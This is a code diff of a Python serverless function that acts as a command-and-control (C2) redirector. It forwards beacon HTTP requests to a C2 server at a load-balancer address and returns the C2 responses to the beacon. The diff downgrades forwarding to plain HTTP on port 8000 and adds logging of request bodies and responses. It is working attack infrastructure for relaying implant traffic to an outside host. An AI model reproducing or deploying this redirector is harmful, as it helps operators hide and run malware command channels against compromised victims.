@@ -3,15 +3,13 @@ import base64
 import os
 import requests
 def redirector(event, context):
-    print(event)
-
     #######
     # Forward HTTP request to C2
     #######
     # Setup forwarding URL
 
     redirect = os.getenv("LOADBLCIP")
-    url = "https://" + redirect + event["requestContext"]["http"]["path"]
+    url = "http://" + redirect + ":8000" + event["requestContext"]["http"]["path"]
     
     # Parse Query String Parameters
     queryStrings = {}
@@ -32,6 +30,8 @@ def redirector(event, context):
         else:
             body = event["body"]
     
+    print(f"Request done to {url} with data {body}")
+
     # Forward request to C2
     requests.packages.urllib3.disable_warnings() 
     
@@ -42,6 +42,8 @@ def redirector(event, context):
     else:
         return "ERROR: INVALID REQUEST METHOD! Must be POST or GET"
     
+    print(resp)
+
     ########
     # Return response to beacon
     ########
